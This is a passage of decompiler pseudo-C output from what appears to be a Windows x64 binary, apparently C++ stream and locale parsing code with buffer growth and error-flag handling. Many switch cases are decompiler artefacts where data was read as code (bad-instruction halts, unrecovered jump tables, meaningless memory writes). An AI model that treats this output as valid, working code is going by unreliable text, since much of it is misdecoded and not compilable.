(*(*arg1)[9])(arg1);\n        }\n        bVar89 = false;\n        if (iVar45 == -1) {\n            arg1 = NULL;\n            bVar89 = bVar79;\n        }\ncode_r0x000140041c18:\n        bVar79 = in_stack_00000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar79)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar45 = *unaff_RBP[2];\n            }\n            else {\n                iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar79 = iVar45 == -1;\n        }\n        if (bVar79 == bVar89) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar44;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != piStack24) {\n            fcn.1400bc6c0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400bc6c0();\n        }\n        return in_stack_000000e8;\n    case 0x36:\ncode_r0x000140041911:\n        if (arg3 == -1) {\n            arg1 = NULL;\n        }\ncode_r0x000140041855:\n        iVar83 = iStack44;\n        piVar88 = in_stack_00000060;\n        uVar44 = unaff_RDI;\n        do {\n            iVar45 = arg3;\n            if (iVar45 == *UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x000140041872;\n            UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ + 2;\n        } while (UNRECOVERED_JUMPTABLE._0_8_ != unaff_RSI);\n        if (*(piStack56 + 0x22) == iVar45) {\n            uVar40 = uStack0000000000000045;\n            if (uStack0000000000000045 != 0) goto joined_r0x000140041bef;\n            if (*(piStack56 + 0xb) < 1) goto code_r0x000140041be0;\n            _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n            uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n            iStack44 = 0;\n            in_stack_00000040 = CONCAT44(uStack0000000000000044, iVar83);\n            goto code_r0x0001400418d6;\n        }\n        if (*(piStack56 + 4) == 0) goto code_r0x000140041be0;\n        uVar40 = *(piStack56 + 4);\n        if ((*(piStack56 + 0x24) == iVar45) && (uVar40 = uStack0000000000000045,  uStack0000000000000045 == 0)) {\n            if (iStack44 == 0) {\n                uVar40 = 0;\n                goto joined_r0x000140041bef;\n            }\n            piVar81 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                piVar68 = 0xf;\n            }\n            else {\n                piVar68 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n            }\n            if (piVar68 < piVar81) {\n                fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + piVar88) = iStack44;\n            iStack44 = 0;\n            *(in_stack_00000058 + 1 + piVar88) = 0;\n            piVar88 = arg1[2];\n            in_stack_00000060 = piVar81;\n            if (arg1[3] <= piVar88) goto code_r0x000140041b2b;\n            goto code_r0x0001400418e4;\n        }\n        goto joined_r0x000140041bef;\n    case 0x37:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        goto code_r0x000140041872;\n    case 0x38:\n        in(arg3);\n        goto code_r0x00014004184d;\n    case 0x39:\n        goto code_r0x000140041726;\n    case 0x3a:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        puVar84 = iVar58 + 0x1b410d2c0;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        cVar39 = *(iVar58 + 0x14010b1d3);\n        *(UNRECOVERED_JUMPTABLE._0_8_ + arg3 * 4) = in_FS;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(arg3 + 4) = *(arg3 + 4) + uVar80;\n        fcn.1400a9080(CONCAT71(0x14010b2, cVar39 + 'H' + CARRY1(uVar41, uVar40)), arg3);\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = 0;\n        in_stack_00000088 = 0;\n        piStack24 = in_stack_00000078;\n        fcn.1400a9080(puStackX32, 0x20);\n        uStack0000000000000044 = uStack0000000000000044 & 0xffff00ff;\n        iStack44 = 0;\n        UNRECOVERED_JUMPTABLE =\n             CONCAT88(SUB168(UNRECOVERED_JUMPTABLE >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140040332. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar59 = (*(*(*(puStackX16 + UNRECOVERED_JUMPTABLE._8_8_) * 4 + 0x14010b330) + 0x14010b330))();\n                return ppiVar59;\n            }\n            uVar40 = 1;\ncode_r0x00014004060d:\n            uVar44 = unaff_RDI;\n            auVar90 = UNRECOVERED_JUMPTABLE >> 0x40;\n            UNRECOVERED_JUMPTABLE = CONCAT88(UNRECOVERED_JUMPTABLE._8_8_ + 1, UNRECOVERED_JUMPTABLE._0_8_);\n        } while ((SUB164(auVar90, 0) + 1 < 4 & uVar40) != 0);\n        if ((0x1 < unaff_RBX & uVar40) == 0) {\n            if (uVar40 == 0) {\ncode_r0x0001400408b5:\n                uVar40 = uVar44 == 0xffff;\n                goto code_r0x0001400408bd;\n            }\njoined_r0x000140041053:\n            if ((1 < in_stack_00000080) && (uVar55 = fcn.14002f7b0(puStackX32, 0x30, 0),  uVar55 != 0)) {\n                if (uVar55 == 0xffffffffffffffff) {\n                    uVar55 = in_stack_00000080 - 1;\n                    if (in_stack_00000080 == 0) {\n                        *in_stack_00000078 = '\\0';\n                    }\n                    else if (uVar55 != 0) goto code_r0x000140040f20;\n                }\n                else {\ncode_r0x000140040f20:\n                    uVar67 = in_stack_00000080;\n                    if (uVar55 <= in_stack_00000080) {\n                        uVar67 = uVar55;\n                    }\n                    fcn.1400a9130(puStackX32, 0, uVar67);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != '0')) {\n                fcn.1400a76a0(puStackX32, 0, 0, 1);\n            }\n            piVar88 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                piVar81 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = iStack44;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    piVar68 = 0xf;\n                }\n                else {\n                    piVar68 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n                }\n                if (piVar68 < piVar81) {\n                    fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + piVar88) = uStack0000000000000040;\n                *(in_stack_00000058 + 1 + piVar88) = 0;\n                in_stack_00000060 = piVar81;\n                cVar39 = fcn.1400b7670(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar39 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            uVar40 = uVar44 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != iStack44)) goto code_r0x0001400408bd;\n            fcn.1400a78c0(in_stack_00000118, puStackX32);\n            bVar89 = arg1 != NULL && uVar40;\n            if (arg1 == NULL || !uVar40) goto code_r0x0001400408d8;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                uVar44 = unaff_RDI;\n                uVar40 = uVar44 == 0xffff;\n                unaff_R12 = uVar40;\n                bVar79 = arg1 != NULL && uVar40;\n                bVar89 = uVar40;\n                if (bVar79) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar45 = *arg1[2];\n                    }\n                    else {\n                        iVar45 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar45 == -1) {\n                        arg1 = NULL;\n                    }\n                    bVar89 = iVar45 == -1 && bVar79;\n                }\n                bVar79 = unaff_RBP != NULL && iStack46 == -1;\n                if (bVar79) break;\n                if ((iStack46 == -1) == bVar89) goto code_r0x000140040c58;\ncode_r0x0001400403bd:\n                if (unaff_RBX <= unaff_R14) goto code_r0x000140040c58;\n                if ((arg1 != NULL) && (uVar40)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar44 = *arg1[2];\n                    }\n                    else {\n                        uVar44 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar44 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\ncode_r0x0001400403db:\n                uVar40 = unaff_R12;\n                bVar89 = *(unaff_R15 + unaff_R14 * 2) != uVar44;\n                uVar44 = unaff_RDI;\n                if (bVar89) goto code_r0x0001400408bd;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar45 = *unaff_RBP[2];\n            }\n            else {\n                iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar45 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar45 == -1 && bVar79) != bVar89) goto code_r0x0001400403bd;\ncode_r0x000140040c58:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x000140041053;\ncode_r0x0001400408bd:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar89 = arg1 != NULL & uVar40;\n            if (bVar89 == false) goto code_r0x0001400408d8;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar45 = *arg1[2];\n        }\n        else {\n            iVar45 = (*(*arg1)[9])(arg1);\n        }\n        uVar40 = 0;\n        if (iVar45 == -1) {\n            arg1 = NULL;\n            uVar40 = bVar89;\n        }\ncode_r0x0001400408d8:\n        bVar89 = in_stack_00000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar89)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar45 = *unaff_RBP[2];\n            }\n            else {\n                iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar89 = iVar45 == -1;\n        }\n        if (bVar89 == uVar40) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar44;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != piStack24) {\n            fcn.1400bc6c0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400bc6c0();\n        }\n        return in_stack_000000e8;\n    case 0x3b:\ncode_r0x0001400405c0:\n        if (arg1[2] < arg1[3]) {\n            uVar55 = *arg1[2];\n        }\n        else {\n            uVar49 = (*(*arg1)[9])(arg1);\n            uVar55 = uVar49;\n        }\n        if (uVar55 == -1) {\n            arg1 = NULL;\n        }\ncode_r0x000140040515:\n        iVar83 = iStack44;\n        piVar88 = in_stack_00000060;\n        uVar44 = unaff_RDI;\n        do {\n            iVar45 = uVar55;\n            if (iVar45 == *UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x000140040532;\n            UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ + 2;\n        } while (UNRECOVERED_JUMPTABLE._0_8_ != unaff_RSI);\n        if (*(piStack56 + 0x22) == iVar45) {\n            uVar40 = uStack0000000000000045;\n            if (uStack0000000000000045 != 0) goto joined_r0x0001400408af;\n            if (*(piStack56 + 0xb) < 1) goto code_r0x0001400408a0;\n            _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n            uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n            iStack44 = 0;\n            in_stack_00000040 = CONCAT44(uStack0000000000000044, iVar83);\n            goto code_r0x000140040596;\n        }\n        if (*(piStack56 + 4) == 0) goto code_r0x0001400408a0;\n        uVar40 = *(piStack56 + 4);\n        if ((*(piStack56 + 0x24) == iVar45) && (uVar40 = uStack0000000000000045,  uStack0000000000000045 == 0)) {\n            if (iStack44 == 0) {\n                uVar40 = 0;\n                goto joined_r0x0001400408af;\n            }\n            piVar81 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                piVar68 = 0xf;\n            }\n            else {\n                piVar68 = CONCAT62(in_stack_0000006a, in_stack_00000068);\n            }\n            if (piVar68 < piVar81) {\n                fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + piVar88) = iStack44;\n            iStack44 = 0;\n            *(in_stack_00000058 + 1 + piVar88) = 0;\n            piVar88 = arg1[2];\n            in_stack_00000060 = piVar81;\n            if (arg1[3] <= piVar88) goto code_r0x0001400407eb;\n            goto code_r0x0001400405a4;\n        }\n        goto joined_r0x0001400408af;\n    case 0x3c:\n        *(unaff_RDI + 0x14010b1fe) = *(unaff_RDI + 0x14010b1fe) + uVar50;\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar40 - 2;\n        goto code_r0x000140040532;\n    case 0x3d:\n        if (bVar89) goto code_r0x0001400404fc;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        goto code_r0x0001400404fc;\n    case 0x3e:\n        uVar40 = in(0xf);\n        uVar44 = UNRECOVERED_JUMPTABLE._0_8_ & 0xff00 | uVar40;\n        goto code_r0x0001400403db;\n    case 0x42:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(arg3 + 0x28021b) = *(arg3 + 0x28021b) + -0x4e;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(UNRECOVERED_JUMPTABLE._0_8_ * 2) = *(UNRECOVERED_JUMPTABLE._0_8_ * 2) + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *unaff_RDI = uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ | uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(unaff_RBP + 0x50042c945) = *(unaff_RBP + 0x50042c945) + 'H';\n        break;\n    case 0x53:\ncode_r0x000140044ee6:\n        puStackX16 = *(unaff_RSI + 3) & 0xffffffff000000b0;\n        unaff_R15 = UNRECOVERED_JUMPTABLE._0_8_ + unaff_R12;\n        if ((*(unaff_RSI + 3) & 0x200) != 0) {\n            unaff_R15 = unaff_R15 + arg1[6];\n        }\n        break;\n    case 0x54:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x55:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        iVar83 = unaff_RBP;\n        if (uVar50 < 0) {\n            iVar83 = unaff_R14;\n        }\n        if (arg1[3] == NULL) {\n            ppiVar59 = unaff_RDI;\n            fcn.1400aa790(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), 0, unaff_R12, unaff_RDI);\n            iVar48 = *(arg1 + 0xb);\n        }\n        else {\n            fcn.1400ab0f0(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), 0, unaff_R12, iVar83 * 2);\n            iVar58 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n            iVar85 = fcn.1400b6270(iVar58, *(arg1 + 0x24), arg1[2], arg1[3]);\n            iVar85 = iVar85 - iVar58;\n            ppiVar86 = iVar85 >> 1;\n            ppiVar59 = in_stack_00000040;\n            if (in_stack_00000040 < ppiVar86) goto code_r0x0001400454dc;\n            *(CONCAT62(in_stack_0000003a, in_stack_00000038) + iVar85) = 0;\n            iVar48 = *(arg1 + 0xb);\n            in_stack_00000040 = ppiVar86;\n        }\n        ppiVar86 = in_stack_00000040;\n        unaff_R12 = in_stack_00000040;\n        if (iVar48 < 1) goto code_r0x000140044ee6;\n        arg2 = in_stack_00000040 + 1;\n        piStack24 = piStack24 & 0xffffffffffff0000 | *(arg1 + 0x22);\n        puVar57 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n        if (puVar57 == in_stack_00000000) {\n            ppiVar59 = 0x7;\n        }\n        else {\n            ppiVar59 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n        }\n        if (ppiVar59 < arg2) {\n            fcn.1400aced0(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), in_stack_00000040, 0, 0);\n            puVar57 = CONCAT62(in_stack_0000003a, in_stack_00000038);\n        }\n        ppiVar59 = NULL;\n        puVar57[ppiVar86] = piStack24._0_2_;\n        puVar57[ppiVar86 + 1] = 0;\n        in_stack_00000040 = arg2;\n        if (iVar83 < 0) {\n            UNRECOVERED_JUMPTABLE._0_8_ = NULL;\n            ppiVar59 = -iVar83;\n            fcn.1400ab0f0(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), arg2, 0, ppiVar59);\n            if (unaff_R14 <= 0x1fffffffffffffff - in_stack_00000040) goto code_r0x000140045269;\n            fcn.1400bd360(0x14010b302);\n            goto code_r0x0001400454c4;\n        }\n        unaff_R14 = *(arg1 + 0xb);\n        unaff_RDI = unaff_RDI + iVar83 * 2;\n        if (unaff_R14 <= 0x1fffffffffffffff - arg2) {\ncode_r0x000140045269:\n            fcn.1400acd00(CONCAT44(iStack44, CONCAT22(iStack46, uStack48)), unaff_RDI, unaff_R14);\n            unaff_R12 = in_stack_00000040;\n            goto code_r0x000140044ee6;\n        }\n        goto code_r0x0001400454d0;\n    case 0x56:\ncode_r0x000140044f88:\n    // WARNING: Could not recover jumptable at 0x000140044f8c. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppiVar59 = (*UNRECOVERED_JUMPTABLE._0_8_)();\n        return ppiVar59;\n    case 0x57:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x58:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        goto code_r0x000140044646;\n    case 0x59:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar77 = &puStack104;\ncode_r0x0001400445bb:\n        uVar49 = unaff_RBP;\n        *(ppuVar77 + 0x20) = 0;\n        *(ppuVar77 + -8) = 0x1400445dd;\n        fcn.1400ab0f0(*(ppuVar77 + 0x38), 0, unaff_R12, uVar49 * 2);\n        iVar58 = *(ppuVar77 + 0xa0);\n        piVar88 = arg1[3];\n        piVar81 = arg1[2];\n        uVar44 = *(arg1 + 0x24);\n        *(ppuVar77 + 0x28) = uVar49 * 2 + unaff_RDI;\n        *(ppuVar77 + 0x20) = unaff_RDI;\n        *(ppuVar77 + -8) = 0x140044606;\n        iVar85 = fcn.1400b6270(iVar58, uVar44, piVar81, piVar88);\n        ppiVar59 = *(ppuVar77 + 0xa8);\n        iVar85 = iVar85 - iVar58;\n        unaff_R12 = iVar85 >> 1;\n        if (ppiVar59 < unaff_R12) goto code_r0x000140044c3c;\n        *(ppuVar77 + 0xa8) = unaff_R12;\n        *(*(ppuVar77 + 0xa0) + iVar85) = 0;\n        iVar83 = *(arg1 + 0xb);\n        goto code_r0x00014004463e;\n    case 0x5a:\n        unaff_R12 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n        iVar83 = puStack104;\n        uVar49 = unaff_R14 - iVar83;\n        unaff_RBP = uVar49;\n        ppuVar77 = auStack96;\n        if (0 < uVar49) {\n            if (iVar83 < 0) {\n                unaff_RBP = unaff_R14 & 0xffffffff;\n            }\n            uVar49 = unaff_RBP;\n            ppuVar77 = auStack96;\n            if (arg1[3] != NULL) goto code_r0x0001400445bb;\n            puStack104 = 0x140044afa;\n            ppiVar59 = unaff_RDI;\n            fcn.1400aa790(uVar56, 0, unaff_R12, unaff_RDI);\n            iVar83 = *(arg1 + 0xb);\n            unaff_R12 = CONCAT44(in_stack_0000004c, in_stack_00000048);\n            ppuVar77 = auStack96;\n        }\ncode_r0x00014004463e:\n        if (iVar83 < 1) {\ncode_r0x000140044646:\n            uVar49 = *(unaff_RSI + 3);\n            *(ppuVar77 + 0x78) = uVar49 & 0xb0;\n            piVar88 = *(ppuVar77 + 0x40) + unaff_R12;\n            if ((uVar49 & 0x200) != 0) {\n                piVar88 = piVar88 + arg1[6];\n            }\n            *(ppuVar77 + 200) = 0;\n            *(ppuVar77 + 0x50) = ppuVar77 + 0xc0;\n            *(ppuVar77 + 0x60) = ppuVar77 + 0xd0;\n            *(ppuVar77 + 0xc0) = ppuVar77 + 0xd0;\n            *(ppuVar77 + 0xd0) = 0;\n            *(ppuVar77 + -8) = 0x1400446aa;\n            fcn.1400acbc0(ppuVar77 + 0xc0, piVar88 * 2);\n            piVar81 = unaff_RSI[2];\n            puVar84 = ppuVar77 + 0x9c;\n            piVar68 = *(ppuVar77 + 200);\n            *(ppuVar77 + 0x7d) = *(ppuVar77 + 0x78) == 0x10 && piVar88 < piVar81;\n            do {\n                if (*puVar84 < 5) {\n                    switch(*puVar84) {\n                    case 0:\n                        if (*(ppuVar77 + 0x7d) != '\\0') {\ncode_r0x000140044807:\n                            ppiVar59 = piVar81 - piVar88;\n                            *(ppuVar77 + 0x20) = *(ppuVar77 + 0x4a);\n                            *(ppuVar77 + -8) = 0x140044826;\n                            fcn.1400ab0f0(*(ppuVar77 + 0x50), piVar68, 0, ppiVar59);\n                            goto code_r0x000140044860;\n                        }\n                        break;\n                    case 1:\ncode_r0x0001400447a0:\n                        if (*(ppuVar77 + 0x7d) != '\\0') goto code_r0x000140044807;\n                        *(ppuVar77 + 0x70) = piVar68 + 1;\n                        iVar58 = *(ppuVar77 + 0xc0);\n                        if (iVar58 == *(ppuVar77 + 0x60)) {\n                            uVar55 = 7;\n                        }\n                        else {\n                            uVar55 = *(ppuVar77 + 0xd0);\n                        }\n                        if (uVar55 < *(ppuVar77 + 0x70)) {\n                            ppiVar59 = NULL;\n                            *(ppuVar77 + 0x20) = 1;\n                            *(ppuVar77 + -8) = 0x140044bd4;\n                            fcn.1400aced0(*(ppuVar77 + 0x50), piVar68, 0, 0);\n                            iVar58 = *(ppuVar77 + 0xc0);\n                        }\n                        piVar69 = *(ppuVar77 + 0x70);\n                        *(iVar58 + piVar68 * 2) = *(ppuVar77 + 0x4a);\n                        *(ppuVar77 + 200) = piVar69;\n                        *(iVar58 + 2 + piVar68 * 2) = 0;\n                        piVar68 = piVar69;\n                        break;\n                    case 2:\n                        if ((*(unaff_RSI + 0x19) & 2) != 0) {\n                            ppiVar86 = arg1[6];\n                            piVar69 = arg1[5];\n                            if (ppiVar86 <= 0x1fffffffffffffff - piVar68) goto code_r0x000140044856;\n                            *(ppuVar77 + -8) = 0x14004479c;\n                            fcn.1400bd360(0x14010b302);\n                            goto code_r0x0001400447a0;\n                        }\n                        break;\n                    case 3:\n                        if (*(ppuVar77 + 0x40) != 0) {\n                            *(ppuVar77 + 0x7e) = **(ppuVar77 + 0x58);\n                            *(ppuVar77 + 0x70) = piVar68 + 1;\n                            iVar58 = *(ppuVar77 + 0xc0);\n                            if (iVar58 == *(ppuVar77 + 0x60)) {\n                                uVar55 = 7;\n                            }\n                            else {\n                                uVar55 = *(ppuVar77 + 0xd0);\n                            }\n                            if (uVar55 < *(ppuVar77 + 0x70)) {\n                                ppiVar59 = NULL;\n                                *(ppuVar77 + 0x20) = 1;\n                                *(ppuVar77 + -8) = 0x140044b74;\n                                fcn.1400aced0(*(ppuVar77 + 0x50), piVar68, 0, 0);\n                                iVar58 = *(ppuVar77 + 0xc0);\n                            }\n                            *(iVar58 + piVar68 * 2) = *(ppuVar77 + 0x7e);\n                            piVar69 = *(ppuVar77 + 0x70);\n                            *(ppuVar77 + 200) = piVar69;\n                            *(iVar58 + 2 + piVar68 * 2) = 0;\n                            piVar68 = piVar69;\n                        }\n                        break;\n                    case 4:\n                        ppiVar86 = *(ppuVar77 + 0xa8);\n                        piVar69 = *(ppuVar77 + 0xa0);\n                        if (0x1fffffffffffffff - piVar68 < ppiVar86) {\n                            *(ppuVar77 + -8) = 0x140044c18;\n                            fcn.1400bd360(0x14010b302);\n                            goto code_r0x000140044c18;\n                        }\ncode_r0x000140044856:\n                        *(ppuVar77 + -8) = 0x140044860;\n                        fcn.1400acd00(*(ppuVar77 + 0x50), piVar69, ppiVar86);\ncode_r0x000140044860:\n                        piVar68 = *(ppuVar77 + 200);\n                    }\n                }\n                puVar84 = puVar84 + 1;\n            } while (*(ppuVar77 + 0x38) != puVar84);\n            if (*(ppuVar77 + 0x40) < 2) {\ncode_r0x000140044886:\n                if (piVar68 < piVar81) {\n                    *(ppuVar77 + 0x20) = *(ppuVar77 + 0x4c);\n                    if (*(ppuVar77 + 0x78) == 0x20) {\n                        *(ppuVar77 + -8) = 0x140044a2d;\n                        fcn.1400ab0f0(*(ppuVar77 + 0x50), piVar68, 0, piVar81 - piVar68);\n                        piVar68 = piVar81;\n                    }\n                    else {\n                        *(ppuVar77 + -8) = 0x1400448b7;\n                        fcn.1400ab0f0(*(ppuVar77 + 0x50), 0, 0, piVar81 - piVar68);\n                        piVar68 = piVar81;\n                    }\n                }\n                iVar58 = *(ppuVar77 + 0xc0);\n                uVar55 = unaff_R13 & 0xffffffff;\n                if (unaff_R13 == '\\0') {\n                    pcVar2 = *(**(ppuVar77 + 0x30) + 0x60);\n                    *(ppuVar77 + -8) = 0x1400448db;\n                    iVar85 = (*pcVar2)(*(ppuVar77 + 0x30), iVar58, piVar68);\n                    iVar58 = *(ppuVar77 + 0xc0);\n                    if (piVar68 != iVar85) {\n                        uVar55 = 1;\n                    }\n                }\n                *(ppuVar77 + 0x88) = uVar55 & 0xff;\n                *(ppuVar77 + 0x80) = *(ppuVar77 + 0x30);\n                if (iVar58 != *(ppuVar77 + 0x60)) {\n                    *(ppuVar77 + -8) = 0x14004491b;\n                    fcn.1400bc6c0(iVar58);\n                }\n                if (*(ppuVar77 + 0xa0) != *(ppuVar77 + 0x68)) {\n                    *(ppuVar77 + -8) = 0x140044936;\n                    fcn.1400bc6c0();\n                }\n                ppiVar59 = *(ppuVar77 + 0x130);\n                unaff_RSI[2] = NULL;\n                piVar88 = *(ppuVar77 + 0x30);\n                ppiVar59[1] = unaff_R13 & 0xffffffffffffff00 | uVar55 & 0xff;\n                *ppiVar59 = piVar88;\n                return ppiVar59;\n            }\n            ppiVar86 = *(ppuVar77 + 0x40) - 1;\n            if (ppiVar86 <= 0x1fffffffffffffff - piVar68) {\n                *(ppuVar77 + -8) = 0x140044a10;\n                fcn.1400acd00(*(ppuVar77 + 0x50), *(ppuVar77 + 0x58) + 2, ppiVar86);\n                piVar68 = *(ppuVar77 + 200);\n                goto code_r0x000140044886;\n            }\ncode_r0x000140044c24:\n            *(ppuVar77 